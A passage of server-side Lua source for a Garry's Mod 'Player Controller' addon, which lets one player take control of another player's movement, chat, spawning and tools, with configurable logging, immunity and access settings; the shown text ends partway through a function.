hb_playercontroller = hb_playercontroller or {}

util.AddNetworkString("hb_playercontrollernetwork")

hb_playercontroller.conVarsCommands = {
	["logging"] = CreateConVar("hb_playercontroller_log", (game.IsDedicated() and "1" or "0"), FCVAR_SERVER_CAN_EXECUTE, "Specifies whether to log Player Controller usage [0: Disabled | 1: Enabled]"),
	["loggingcl"] = CreateConVar("hb_playercontroller_log_cl", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY}, "Specifies whether to log Player Controller usage to Clients [0: Disabled | 1: Everyone | 2: Admins only | 3: Superadmins only]"),
	["immunity"] = CreateConVar("hb_playercontroller_immunity", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY}, "Specifies whether to use immunity, where lower usergroups cannot target higher usergroups [0: Disabled | 1: Enabled]"),
	["access"] = CreateConVar("hb_playercontroller_access", "0", {FCVAR_SERVER_CAN_EXECUTE, FCVAR_NOTIFY}, "Specifies the minimum required access rights to use the Player Controller [0: Everyone | 1: Admins only | 2: Superadmins only | 3: Custom-defined]")
}

SetGlobalBool(hb_playercontroller.conVarsCommands["immunity"]:GetName(), hb_playercontroller.conVarsCommands["immunity"]:GetBool())
SetGlobalInt(hb_playercontroller.conVarsCommands["access"]:GetName(), hb_playercontroller.conVarsCommands["access"]:GetInt())

cvars.AddChangeCallback(hb_playercontroller.conVarsCommands["immunity"]:GetName(), function(nme, vol, vnw)
	SetGlobalBool(nme, tobool(vnw))
end)
cvars.AddChangeCallback(hb_playercontroller.conVarsCommands["access"]:GetName(), function(nme, vol, vnw)
	SetGlobalInt(nme, math.Round(tonumber(vnw)))
end)

-- Networks the passed Arguments to the Clients.
function hb_playercontroller.networkSend(ply, tbl)
	net.Start("hb_playercontrollernetwork")
		net.WriteTable(tbl)
	net.Send(ply)
end

-- Manages logging to Server and Clients.
function hb_playercontroller.logSubmit(str, usr)
	local users = {usr}
	local loggingcl = hb_playercontroller.conVarsCommands["loggingcl"]
	
	if loggingcl:GetInt() ~= 0 then
		for k, v in ipairs(player.GetAll()) do
			if loggingcl:GetInt() == 3 and v:IsSuperAdmin() then
				table.insert(users, v)
			elseif loggingcl:GetInt() == 2 and (v:IsAdmin() or v:IsSuperAdmin()) then
				table.insert(users, v)
			elseif loggingcl:GetInt() == 1 then
				table.insert(users, v)
			end
		end
		
		if #users > 0 then
			hb_playercontroller.networkSend(users, {
				arg = 5,
				log = str
			})
		end
	end
	
end

-- Instructs the Server using data received from the Client.
net.Receive("hb_playercontrollernetwork", function(len, ply)
	if not (IsValid(ply) or ply:IsPlayer()) then return end
	local argc = net.ReadInt(6)
	local ctrlr = ply.hb_playercontrollerCTRLR
	
	if ctrlr then
		if argc == 1 then
			local rctrld = ctrlr["plyControlled"]
			if not IsValid(rctrld) then return end
			local all = net.ReadBool()
			local typ = "Everything"
			
			if all then
				local tbl = undo.GetTable()[rctrld:UniqueID()]
				
				cleanup.CC_Cleanup(rctrld, nil, {})
			else
				typ = net.ReadString()
				
				cleanup.CC_Cleanup(rctrld, nil, {string.lower(typ)})
			end
			
			hb_playercontroller.networkSend(ply, {
				arg = 1,
				message = "Cleaned up Type: "..typ,
				type = NOTIFY_CLEANUP,
				sound = "buttons/button15.wav"
			})
		elseif argc == 2 then
			local rctrld = ctrlr["plyControlled"]
			if not IsValid(rctrld) then return end
			local wep = net.ReadString()
			
			rctrld:SelectWeapon(wep)
		elseif argc == 3 then
			local rctrld = ctrlr["plyControlled"]
			if not IsValid(rctrld) then return end
			local tbl = undo.GetTable()[rctrld:UniqueID()]
			if not tbl then return end
			
			for i = #tbl, 1, -1 do
				if IsValid(tbl[i].Entities[1]) then
					hb_playercontroller.networkSend(ply, {
						arg = 1,
						message = "Undone: "..tbl[i].Name,
						type = NOTIFY_UNDO,
						sound = "buttons/button15.wav"
					})
					undo.Do_Undo(tbl[i])
					tbl[i] = nil
					break
				else
					tbl[i] = nil
				end
			end
		elseif argc == 5 then
			local rctrld = ctrlr["plyControlled"]
			if not IsValid(rctrld) then return end
			local tmd = net.ReadString()
			
			if rctrld:IsBot() then
				hb_playercontroller.networkSend(ply, {
					arg = 1,
					message = "Cannot change Toolmode on Bots",
					type = NOTIFY_ERROR,
					sound = "buttons/button10.wav"
				})
				return
			else
				CC_GMOD_Tool(rctrld, nil, {tmd})
				hb_playercontroller.networkSend(ply, {
					arg = 1,
					message = "Toolmode changed: '"..tmd.."'",
					type = NOTIFY_GENERIC,
					sound = "ambient/water/drip"..math.random(1, 4)..".wav"
				})
			end
		elseif argc == 6 then
			hb_playercontroller.endControl(ply)
		elseif argc == 7 then
			local rctrld = ctrlr["plyControlled"]
			if not IsValid(rctrld) or rctrld:IsBot() then return end
			local noclip = net.ReadBool()
			
			if noclip then
				if rctrld:GetMoveType() == MOVETYPE_NOCLIP and hook.Call("PlayerNoClip", nil, rctrld, false) then
					rctrld:SetMoveType(MOVETYPE_WALK)
				elseif hook.Call("PlayerNoClip", nil, rctrld, true) then
					rctrld:SetMoveType(MOVETYPE_NOCLIP)
				end
			elseif rctrld:CanUseFlashlight() then
				if rctrld:FlashlightIsOn() and hook.Call("PlayerSwitchFlashlight", nil, rctrld, false) then
					rctrld:Flashlight(false)
				elseif not rctrld:FlashlightIsOn() and hook.Call("PlayerSwitchFlashlight", nil, rctrld, true) then
					rctrld:Flashlight(true)
				end
			end
		end
	elseif argc == 4 and ply.hb_playercontrollerCTRLD then
		ply.hb_playercontrollerCTRLD["plySayCommand"] = nil
	end
end)

-- Cease Control.
function hb_playercontroller.endControl(ply, arg)
	local ctrlr = ply
	local ctrld = ply
	
	if ply.hb_playercontrollerCTRLR then
		ctrld = ply.hb_playercontrollerCTRLR["plyControlled"]
	elseif ply.hb_playercontrollerCTRLD then
		ctrlr = ply.hb_playercontrollerCTRLD["plyController"]
	end
	
	local ctrlrNick = "[UNKNOWN]"
	if ctrlr and IsValid(ctrlr) then
		ctrlrNick = ctrlr:Nick()
	end
	
	local ctrldNick = "[UNKNOWN]"
	if ctrld and IsValid(ctrld) then
		ctrldNick = ctrld:Nick()
	end
	
	local rsn = ""
	if arg == 1 then
		rsn = " - Player disconnected"
	elseif arg == 2 then
		rsn = " - Controller died"
	end
	
	timer.Create("hb_playercontrollerEndPre_"..ply:EntIndex(), 0, 1, function()
		if ctrlr.hb_playercontrollerCTRLR and IsValid(ctrlr) then
			ctrlr.hb_playercontrollerCTRLR.endRestore["Ready"] = nil
			ctrlr:UnSpectate()
			ctrlr:Spawn()
			ctrlr:SetPos(ctrlr.hb_playercontrollerCTRLR.endRestore["Pos"])
			ctrlr:ScreenFade(SCREENFADE.IN, color_white, 0.6, 0.3)
			hb_playercontroller.networkSend(ctrlr, {
				arg = 6
			})
			ctrlr:SetNoDraw(false)
			if IsValid(ctrld) then
				local effectdatafrom = EffectData()
					local dpos = ctrld:GetPos()
					local rpos = ctrlr:GetPos()
					
					effectdatafrom:SetOrigin(Vector(dpos.x, dpos.y, dpos.z + 20))
					effectdatafrom:SetStart(Vector(rpos.x, rpos.y, rpos.z + 20))
					effectdatafrom:SetAttachment(1)
					effectdatafrom:SetEntity(ctrld)
				util.Effect("ToolTracer", effectdatafrom)
				local effectdatato = EffectData()
					local rpos = ctrlr:GetPos()
					local dpos = ctrld:GetPos()
					
					effectdatato:SetOrigin(Vector(rpos.x, rpos.y, rpos.z + 20))
					effectdatato:SetStart(Vector(dpos.x, dpos.y, dpos.z + 20))
					effectdatato:SetAttachment(1)
					effectdatato:SetEntity(ctrlr)
				util.Effect("ToolTracer", effectdatato)
			end
			timer.Simple(0.02, function()
				if IsValid(ctrlr) then
					ctrlr:Lock()
				end
			end)
		end
		
		if ctrld.hb_playercontrollerCTRLD and IsValid(ctrld) then
			ctrld.hb_playercontrollerCTRLD.endRestore["Ready"] = nil
			ctrld:ScreenFade(SCREENFADE.IN, color_white, 0.6, 0.3)
			hb_playercontroller.networkSend(ctrld, {
				arg = 6
			})
			ctrld.hb_playercontrollerCTRLD.endRestore["NoDraw"] = ctrld:GetNoDraw()
			ctrld.hb_playercontrollerCTRLD.endRestore["Material"] = ctrld:GetMaterial()
			ctrld:SetNoDraw(false)
			if IsValid(ctrlr) then
				local effectdatafrom = EffectData()
					local dpos = ctrld:GetPos()
					local rpos = ctrlr:GetPos()
					
					effectdatafrom:SetOrigin(Vector(dpos.x, dpos.y, dpos.z + 20))
					effectdatafrom:SetStart(Vector(rpos.x, rpos.y, rpos.z + 20))
					effectdatafrom:SetAttachment(1)
					effectdatafrom:SetEntity(ctrld)
				util.Effect("ToolTracer", effectdatafrom)
				local effectdatato = EffectData()
					local rpos = ctrlr:GetPos()
					local dpos = ctrld:GetPos()
					
					effectdatato:SetOrigin(Vector(rpos.x, rpos.y, rpos.z + 20))
					effectdatato:SetStart(Vector(dpos.x, dpos.y, dpos.z + 20))
					effectdatato:SetAttachment(1)
					effectdatato:SetEntity(ctrlr)
				util.Effect("ToolTracer", effectdatato)
			end
			ctrld:Lock()
		end
	end)
	
	timer.Create("hb_playercontrollerEndPost_"..ply:EntIndex(), 0.6, 1, function()
		if IsValid(ctrlr) then
			for k, v in pairs(ctrlr.hb_playercontrollerCTRLR.endRestore["Weapons"]) do
				ctrlr:Give(v)
			end
			ctrlr:SelectWeapon("weapon_hbplayercontroller")
			ctrlr:SetNoDraw(ctrlr.hb_playercontrollerCTRLR.endRestore["NoDraw"])
			ctrlr:SetMaterial(ctrlr.hb_playercontrollerCTRLR.endRestore["Material"])
			ctrlr:SetCollisionGroup(ctrlr.hb_playercontrollerCTRLR.endRestore["Collide"])
			ctrlr:SetAvoidPlayers(ctrlr.hb_playercontrollerCTRLR.endRestore["Avoid"])
			ctrlr:UnLock()
			ctrlr:SetNWInt("hb_playercontrollerCMDButtons", 0)
			ctrlr:SetNWInt("hb_playercontrollerCMDImpulse", 0)
			ctrlr.hb_playercontrollerCTRLR = nil
		end
		if IsValid(ctrld) then
			ctrld:SetNoDraw(ctrld.hb_playercontrollerCTRLD.endRestore["NoDraw"])
			ctrld:SetMaterial(ctrld.hb_playercontrollerCTRLD.endRestore["Material"])
			ctrld:UnLock()
			ctrld:SetNWBool("hb_playercontrollerPLYControlled", false)
			ctrld.hb_playercontrollerCTRLD = nil
		end
		
		if not hb_playercontroller.activeControllers() then
			hook.Remove("PlayerDisconnected", "hb_playercontrollerHandleDisconnect")
			hook.Remove("StartCommand", "hb_playercontrollerOverrideCommand")
			hook.Remove("PlayerSay", "hb_playercontrollerOverridePlayerSay")
			hook.Remove("CanPlayerSuicide", "hb_playercontrollerOverridePlayerSuicide")
			hook.Remove("PlayerSpray", "hb_playercontrollerOverridePlayerSpray")
			hook.Remove("PlayerCanHearPlayersVoice", "hb_playercontrollerOverrideHearVoice")
			hook.Remove("PlayerCanPickupWeapon", "hb_playercontrollerOverridePickupWeapon")
			hook.Remove("PlayerSwitchFlashlight", "hb_playercontrollerOverrideSwitchFlashlight")
			hook.Remove("CanPlayerEnterVehicle", "hb_playercontrollerOverrideEnterVehicle")
			hook.Remove("PlayerEnteredVehicle", "hb_playercontrollerOverrideEnteredVehicle")
			hook.Remove("PlayerDeath", "hb_playercontrollerKillLogs")
			timer.Remove("hb_playercontrollerSpawnTypesUpdate")
			hook.Remove("CanProperty", "hb_playercontrollerOverrideProperty")
			hook.Remove("CanDrive", "hb_playercontrollerOverrideDrive")
			hook.Remove("OnPhysgunReload", "hb_playercontrollerPhysgunUnfreezeNotify")
			hook.Remove("PlayerSpawnObject", "hb_playercontrollerOverrideSpawnObject")
			hook.Remove("PlayerSpawnedProp", "hb_playercontrollerspawnPropNotify")
			hook.Remove("PlayerSpawnedEffect", "hb_playercontrollerspawnEffectNotify")
			hook.Remove("PlayerSpawnedRagdoll", "hb_playercontrollerspawnRagdollNotify")
			hook.Remove("PlayerSpawnedNPC", "hb_playercontrollerspawnNPCNotify")
			hook.Remove("PlayerSpawnedVehicle", "hb_playercontrollerspawnVehicleNotify")
			hook.Remove("PlayerSpawnedSWEP", "hb_playercontrollerspawnSWEPNotify")
			hook.Remove("PlayerSpawnedSENT", "hb_playercontrollerspawnSENTNotify")
			hook.Remove("PlayerSpawnNPC", "hb_playercontrollerOverrideSpawnNPC")
			hook.Remove("PlayerSpawnSENT", "hb_playercontrollerOverrideSpawnSENT")
			hook.Remove("PlayerSpawnVehicle", "hb_playercontrollerOverrideSpawnVehicle")
			hook.Remove("PlayerSpawnSWEP", "hb_playercontrollerOverrideSpawnSWEP")
			hook.Remove("PlayerGiveSWEP", "hb_playercontrollerOverrideGiveSWEP")
		end
	end)
end

-- Handle the Controller or Controlled Player disconnecting.
function hb_playercontroller.handleDisconnect(ply)
	if ply.hb_playercontrollerCTRLR or ply.hb_playercontrollerCTRLD then
		hb_playercontroller.endControl(ply, 1)
	end
end

-- Returns whether there are any Controllers when called.
function hb_playercontroller.activeControllers()
	local ctrl = false
	
	for k, v in ipairs(player.GetAll()) do
		if v.hb_playercontrollerCTRLR then
			ctrl = true
			break
		end
	end
	
	return ctrl
end

-- Refreshes the applicable Spawn Types of the Controlled Player to the Controller.
function hb_playercontroller.spawnTypes()
	for k, v in ipairs(player.GetAll()) do
		if v.hb_playercontrollerCTRLD then
			v.hb_playercontrollerCTRLD["entTypes"] = {}
			local tbl = v.hb_playercontrollerCTRLD["entTypes"]
			local id = v:UniqueID()
			
			if g_SBoxObjects[id] then
				for k2, v2 in pairs(g_SBoxObjects[id]) do
					table.insert(tbl, k2)
				end
			end
			
			hb_playercontroller.networkSend(v.hb_playercontrollerCTRLD["plyController"], {
				arg = 3,
				spawns = tbl
			})
		end
	end
end

-- Initiate Control.
function hb_playercontroller.startControl(ctrlr, ctrld)
	local function failnotify(ply, rsn)
		hb_playercontroller.networkSend(ply, {
			arg = 1,
			message = "Cannot Control Target. "..rsn,
			type = NOTIFY_ERROR,
			sound = "buttons/button10.wav"
		})
	end
	local access = hb_playercontroller.conVarsCommands["access"]
	
	if ctrlr.hb_playercontrollerCTRLD then
		failnotify(ctrlr.hb_playercontrollerCTRLD["plyController"], "Already Controlling a Player")
		return
	end
	
	if ctrld.hb_playercontrollerCTRLD then
		if not ctrlr.hb_playercontrollerCTRLD then
			failnotify(ctrlr, "Player is already Controlled by: "..ctrld.hb_playercontrollerCTRLD["plyController"]:Nick())
		end
		return
	end
	
	if not hb_playercontroller.activeControllers() then
		hook.Add("PlayerDisconnected", "hb_playercontrollerHandleDisconnect", hb_playercontroller.handleDisconnect)
		hook.Add("StartCommand", "hb_playercontrollerOverrideCommand", hb_playercontroller.overrideCommand)
		hook.Add("PlayerSay", "hb_playercontrollerOverridePlayerSay", hb_playercontroller.overridePlayerSay)
		hook.Add("CanPlayerSuicide", "hb_playercontrollerOverridePlayerSuicide", hb_playercontroller.overridePlayerSuicide)
		hook.Add("PlayerSpray", "hb_playercontrollerOverridePlayerSpray", hb_playercontroller.overridePlayerSpray)
		hook.Add("PlayerCanHearPlayersVoice", "hb_playercontrollerOverrideHearVoice", hb_playercontroller.overrideHearVoice)
		hook.Add("PlayerCanPickupWeapon", "hb_playercontrollerOverridePickupWeapon", hb_playercontroller.overrideControllerAccess)
		hook.Add("PlayerSwitchFlashlight", "hb_playercontrollerOverrideSwitchFlashlight", hb_playercontroller.overrideControllerAccess)
		hook.Add("CanPlayerEnterVehicle", "hb_playercontrollerOverrideEnterVehicle", hb_playercontroller.overrideControllerAccess)
		hook.Add("PlayerEnteredVehicle", "hb_playercontrollerOverrideEnteredVehicle", hb_playercontroller.overrideEnteredVehicle)
		hook.Add("PlayerDeath", "hb_playercontrollerKillLogs", hb_playercontroller.killLogs)
		
		if gmod.GetGamemode().IsSandboxDerived then
			timer.Create("hb_playercontrollerSpawnTypesUpdate", 3, 0, function() hb_playercontroller.spawnTypes() end)
			hook.Add("CanProperty", "hb_playercontrollerOverrideProperty", hb_playercontroller.overrideProperty)
			hook.Add("CanDrive", "hb_playercontrollerOverrideDrive", hb_playercontroller.overrideDrive)
			hook.Add("OnPhysgunReload", "hb_playercontrollerPhysgunUnfreezeNotify", hb_playercontroller.physgunUnfreezeNotify)
			hook.Add("PlayerSpawnObject", "hb_playercontrollerOverrideSpawnObject", hb_playercontroller.overrideSpawnObject)
			hook.Add("PlayerSpawnedProp", "hb_playercontrollerspawnPropNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnedEffect", "hb_playercontrollerspawnEffectNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnedRagdoll", "hb_playercontrollerspawnRagdollNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnedNPC", "hb_playercontrollerspawnNPCNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnedVehicle", "hb_playercontrollerspawnVehicleNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnedSWEP", "hb_playercontrollerspawnSWEPNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnedSENT", "hb_playercontrollerspawnSENTNotify", hb_playercontroller.spawnNotify)
			hook.Add("PlayerSpawnNPC", "hb_playercontrollerOverrideSpawnNPC", hb_playercontroller.overrideSpawnNPC)
			hook.Add("PlayerSpawnSENT", "hb_playercontrollerOverrideSpawnSENT", hb_playercontroller.overrideSpawnSENT)
			hook.Add("PlayerSpawnVehicle", "hb_playercontrollerOverrideSpawnVehicle", hb_playercontroller.overrideSpawnVehicle)
			hook.Add("PlayerSpawnSWEP", "hb_playercontrollerOverrideSpawnSWEP", hb_playercontroller.overrideSpawnSWEP)
			hook.Add("PlayerGiveSWEP", "hb_playercontrollerOverrideGiveSWEP", hb_playercontroller.overrideGiveSWEP)
		end
	end
	
	ctrlr.hb_playercontrollerCTRLR = {}
	ctrlr.hb_playercontrollerCTRLR["plyControlled"] = ctrld
	ctrld.hb_playercontrollerCTRLD = {}
	ctrld.hb_playercontrollerCTRLD["plyController"] = ctrlr
	
	ctrlr:Lock()
	ctrlr:ScreenFade(SCREENFADE.OUT, color_white, 0.2, 0.3)
	ctrlr.hb_playercontrollerCTRLR.endRestore = {
		["Material"] = ctrlr:GetMaterial(),
		["Weapons"] = {},
		["NoDraw"] = ctrlr:GetNoDraw(),
		["Pos"] = ctrlr:GetPos(),
		["Collide"] = ctrlr:GetCollisionGroup(),
		["Avoid"] = ctrlr:GetAvoidPlayers()
	}
	for k, v in ipairs(ctrlr:GetWeapons()) do
		table.insert(ctrlr.hb_playercontrollerCTRLR.endRestore["Weapons"], v:GetClass())
	end
	ctrlr:SetNoDraw(false)
	ctrld:SetNWBool("hb_playercontrollerPLYControlled", true)
	ctrld:Lock()
	ctrld:ScreenFade(SCREENFADE.OUT, color_white, 0.2, 0.3)
	ctrld.hb_playercontrollerCTRLD.endRestore = {
		["Material"] = ctrld:GetMaterial(),
		["NoDraw"] = ctrld:GetNoDraw()
	}
	ctrld:SetNoDraw(false)
	timer.Create("hb_playercontrollerStart_"..ctrlr:EntIndex(), 0.2, 1, function()
		if IsValid(ctrlr) and IsValid(ctrld) then
			ctrlr:ExitVehicle()
			ctrlr:Flashlight(false)
			ctrlr:StripWeapons()
			ctrlr:Spectate(OBS_MODE_CHASE)
			ctrlr:SpectateEntity(ctrld)
			ctrlr:SetMaterial(ctrlr.hb_playercontrollerCTRLR.endRestore["Material"])
			ctrld:SetNoDraw(ctrlr.hb_playercontrollerCTRLR.endRestore["NoDraw"])
			ctrlr:UnLock()
			ctrlr.hb_playercontrollerCTRLR.endRestore["Ready"] = true
			ctrld:SetMaterial(ctrld.hb_playercontrollerCTRLD.endRestore["Material"])
			ctrld:SetNoDraw(ctrld.hb_playercontrollerCTRLD.endRestore["NoDraw"])
			ctrld:UnLock()
			ctrld.hb_playercontrollerCTRLD.endRestore["Ready"] = true
			hb_playercontroller.networkSend(ctrlr, {
				arg = 2,
				player = ctrld,
				controller = true
			})
			hb_playercontroller.networkSend(ctrld, {
				arg = 2,
				player = ctrlr,
				controller = false
			})
		end
	end)
end

-- Override Controlled Player's Commands with the Controller's.
function hb_playercontroller.overrideCommand(ply, cmd)
	if ply.hb_playercontrollerCTRLR then
		local ctrld = ply.hb_playercontrollerCTRLR["plyControlled"]
		if not IsValid(ctrld) then return end
		ply:SetNWInt("hb_playercontrollerCMDButtons", cmd:GetButtons())
		
		if ply.hb_playercontrollerCTRLR.endRestore["Ready"] then
			local spm = OBS_MODE_CHASE
			
			if not (cmd:KeyDown(IN_ATTACK) and cmd:KeyDown(IN_USE)) and not ctrld:InVehicle() then
				ply.hb_playercontrollerCTRLR["cmdViewAngles"] = ply:EyeAngles()
			elseif ctrld:InVehicle() then
				ply.hb_playercontrollerCTRLR["cmdViewAngles"] = ply:EyeAngles()
				spm = OBS_MODE_FIXED
			else
				ply:SetEyeAngles(ply.hb_playercontrollerCTRLR["cmdViewAngles"])
				spm = OBS_MODE_FIXED
			end
			if ply:GetViewEntity() ~= ply then
				spm = OBS_MODE_NONE
			end
			
			local Pos = ctrld:EyePos()
			if ply:GetPos():DistToSqr(Pos) > 10000 then
				ply:SetPos(ctrld:EyePos())
			end
			
			ply:Spectate(spm)
			ply:SetNoDraw(true)
			ply:SetCollisionGroup(COLLISION_GROUP_IN_VEHICLE)
			ply:SetAvoidPlayers(false)
		end
		
		ply.hb_playercontrollerCTRLR["cmdForwardMove"] = cmd:GetForwardMove()
		ply:SetNWInt("hb_playercontrollerCMDImpulse", cmd:GetImpulse())
		ply.hb_playercontrollerCTRLR["cmdMouseWheel"] = cmd:GetMouseWheel()
		ply.hb_playercontrollerCTRLR["cmdMouseX"] = cmd:GetMouseX()
		ply.hb_playercontrollerCTRLR["cmdMouseY"] = cmd:GetMouseY()
		ply.hb_playercontrollerCTRLR["cmdSideMove"] = cmd:GetSideMove()
		ply.hb_playercontrollerCTRLR["cmdUpMove"] = cmd:GetUpMove()
	elseif ply.hb_playercontrollerCTRLD then
		local ctrlr = ply.hb_playercontrollerCTRLD["plyController"]
		if not IsValid(ctrlr) then return end
		
		cmd:SetButtons(ctrlr:GetNWInt("hb_playercontrollerCMDButtons", 0))
		cmd:SetForwardMove(ctrlr.hb_playercontrollerCTRLR["cmdForwardMove"] or 0)
		cmd:SetImpulse(ctrlr:GetNWInt("hb_playercontrollerCMDImpulse", 0))
		cmd:SetMouseWheel(ctrlr.hb_playercontrollerCTRLR["cmdMouseWheel"] or 0)
		cmd:SetMouseX(ctrlr.hb_playercontrollerCTRLR["cmdMouseX"] or 0)
		cmd:SetMouseY(ctrlr.hb_playercontrollerCTRLR["cmdMouseY"] or 0)
		cmd:SetSideMove(ctrlr.hb_playercontrollerCTRLR["cmdSideMove"] or 0)
		cmd:SetUpMove(ctrlr.hb_playercontrollerCTRLR["cmdUpMove"] or 0)
		cmd:SetViewAngles(ctrlr.hb_playercontrollerCTRLR["cmdViewAngles"] or ply:EyeAngles())
		ply:SetEyeAngles(ctrlr.hb_playercontrollerCTRLR["cmdViewAngles"] or ply:EyeAngles())
	end
end

-- Override Controlled Player's Say access with the Controller's and allow commands to be executed.
function hb_playercontroller.overridePlayerSay(ply, txt, ist)
	if ply.hb_playercontrollerCTRLR then
		local ctrld = ply.hb_playercontrollerCTRLR["plyControlled"]
		if not IsValid(ctrld) then return end
		local pos = 0
		
		if string.sub(txt, 1, 3) == "!!!" then
			pos = 4
			if string.sub(txt, 1, pos) == "!!! " then
				pos = 5
			end
			
			return string.sub(txt, pos)
		elseif string.sub(txt, 1, 2) == "!!" then
			pos = 3
			if string.sub(txt, 1, pos) == "!! " then
				pos = 4
			end
			
			if ctrld:IsBot() then
				hb_playercontroller.networkSend(ply, {
					arg = 1,
					message = "Cannot execute Commands on Bots",
					type = NOTIFY_ERROR,
					sound = "buttons/button10.wav"
				})
			else
				local cmd = string.sub(txt, pos)
				ctrld.hb_playercontrollerCTRLD["plySayCommand"] = true
				
				hb_playercontroller.networkSend(ctrld, {
					arg = 4,
					command = cmd
				})
				hb_playercontroller.networkSend(ply, {
					arg = 1,
					message = "Command sent: '"..cmd.."'",
					type = NOTIFY_GENERIC,
					sound = "ambient/water/drip"..math.random(1, 4)..".wav"
				})
			end
			
			return ""
		else
			local tpt = ""
			ctrld.hb_playercontrollerCTRLD["plySayCommand"] = true
			ctrld:Say(txt, ist)
			ctrld.hb_playercontrollerCTRLD["plySayCommand"] = nil
			if ist then
				tpt = "(TEAM) "
			end			
			return ""
		end
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySayCommand"] then
		return ""
	end
end

-- Disable Controller's access to Suicide and Controlled Player's access unless Controller directs.
function hb_playercontroller.overridePlayerSuicide(ply)
	if ply.hb_playercontrollerCTRLR then
		return false
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plySayCommand"] then
		return false
	end
end

-- Disable Controller's access to Spraying.
function hb_playercontroller.overridePlayerSpray(ply)
	if ply.hb_playercontrollerCTRLR then
		return true
	end
end

-- Disable Controlled Player's access to Voice communication.
function hb_playercontroller.overrideHearVoice(lnr, tkr)
	if tkr.hb_playercontrollerCTRLD then
		return false
	end
end

-- Log kills of the Controlled Player.
function hb_playercontroller.killLogs(vic, inf, att)
	if vic.hb_playercontrollerCTRLD then
		local ctrlr = vic.hb_playercontrollerCTRLD["plyController"]
		if not IsValid(ctrlr) then return end
		local klr = "Unknown"
		
		if att:IsPlayer() then
			klr = att:Nick().." ("..att:SteamID()..")"
		elseif IsValid(att) then
			klr = att:GetClass().." ("..att:EntIndex()..")"
		end
		
	elseif att.hb_playercontrollerCTRLD then
		local ctrlr = att.hb_playercontrollerCTRLD["plyController"]
		if not IsValid(ctrlr) then return end
		
	elseif vic.hb_playercontrollerCTRLR then
		hb_playercontroller.endControl(vic, 2)
	end
end

-- Disable Controller's access to Weapon Pickup, using Flashlight and Entering Vehicles.
function hb_playercontroller.overrideControllerAccess(ply)
	if ply.hb_playercontrollerCTRLR and ply.hb_playercontrollerCTRLR.endRestore["Ready"] then
		return false
	end
end

-- Eject Controller from vehicles.
function hb_playercontroller.overrideEnteredVehicle(ply)
	if ply.hb_playercontrollerCTRLR then
		ply:ExitVehicle()
	end
end

-- Override Controlled Player's Property access with the Controller's.
function hb_playercontroller.overrideProperty(ply, prp, ent)
	if ply.hb_playercontrollerCTRLR then
		local ctrld = ply.hb_playercontrollerCTRLR["plyControlled"]
		if not IsValid(ctrld) then return end
		
		ctrld.hb_playercontrollerCTRLD["plyCanProperty"] = true
		local canProperty = hook.Call("CanProperty", nil, ctrld, prp, ent)
		ctrld.hb_playercontrollerCTRLD["plyCanProperty"] = nil
		return canProperty
	elseif ply.hb_playercontrollerCTRLD and not ply.hb_playercontrollerCTRLD["plyCanProperty"] then
		return false
	end
end

-- Disable Controlled and Controller's access to Drive.
function hb_playercontroller.overrideDrive(ply)
	if ply.hb_playercontrollerCTRLR or ply.hb_playercontrollerCTRLD then
		return false
	end
end

-- Notifies the Controller when the Controlled Player Unfreezes Entities.
function hb_playercontroller.physgunUnfreezeNotify(wep, ply)
	if ply.hb_playercontrollerCTRLD then
		local ctrlr = ply.hb_playercontrollerCTRLD["plyController"]
		if not IsValid(ctrlr) then return end
		local num = ply:PhysgunUnfreeze()
		
		if num == 0 then
			num = ply:UnfreezePhysicsObjects()
		elseif num > 0 then
			hb_playercontroller.networkSend(ctrlr, {
				arg = 1,
				message = "Unfroze Objects: "..num,
				type = NOTIFY_GENERIC,
				sound = "npc/roller/mine/rmine_chirp_answer1.wav"
			})
		end
	end
end

-- Spawn the passed Entity as the Controlled Player or notify Controller on failure.
function hb_playercontroller.overrideSpawnInit(ply, ent, arg, ext1, ext2)
	local ctrld = ply.hb_playercontrollerCTRLR["plyControlled"]
	if not IsValid(ctrld) then return end
	local err, typ = false, ""
	
	ctrld.hb_playercontrollerCTRLD["plySpawnInit"] = true
	if arg == 1 then
		if util.IsValidProp(ent) then
			if hook.Call("PlayerSpawnProp", GAMEMODE, ctrld, ent) then
				CCSpawn(ctrld, nil, {ent})
			else
				err, typ = true, "Prop"
			end
		elseif util.IsValidRagdoll(ent) then
			if hook.Call("PlayerSpawnRagdoll", GAMEMODE, ctrld, ent) then
				CCSpawn(ctrld, nil, {ent})
			else
				err, typ = true, "Ragdoll"
			end
		else
			if hook.Call("PlayerSpawnEffect", GAMEMODE, ctrld, ent) then
				CCSpawn(ctrld, nil, {ent})
			else
				err, typ = true, "Effect"
			end
		end
	elseif arg == 2 then
		if hook.Call("PlayerSpawnNPC", GAMEMODE, ctrld, ent, ext1) then
			Spawn_NPC(ctrld, ent)
		else
			err, typ = true, "NPC"
		end
	elseif arg == 3 then
		if hook.Call("PlayerSpawnSENT", GAMEMODE, ctrld, ent) then
			Spawn_SENT(ctrld, ent)
		else
			err, typ = true, "SENT"
		end
	elseif arg == 4 then
		if hook.Call("PlayerSpawnVehicle", GAMEMODE, ctrld, ext1, ent, ext2) then
			Spawn_Vehicle(ctrld, ent)
		else
			err, typ = true, "Vehicle"
		end
	elseif arg == 5 then
		if hook.Call("PlayerSpawnSWEP", GAMEMODE, ctrld, ent, ext1) then
			Spawn_Weapon(ctrld, ent)
		else
			err, typ = true, "Weapon"
		end
	elseif arg == 6 then
		if hook.Call("PlayerGiveSWEP", GAMEMODE, ctrld, ent, ext1) then
			CCGiveSWEP(ctrld, nil, {ent})
		else
			err, typ = true, "Weapon"
		end
	end
	ctrld.hb_playercontrollerCTRLD["plySpawnInit"] = nil
	
	if err then
		hb_playercontroller.networkSend(ply, {
			arg = 1,
			message = "Failed to Spawn Type: "..typ,
			type = NOTIFY_ERROR,
			sound = "buttons/button10.wav"
		})
	end
end

-- Override Controlled Player's Object Spawn access with the Controller's.
function hb_playercontroller.overrideSpawnObject(ply, mdl)
	if ply.hb_playercontrollerCTRLR then
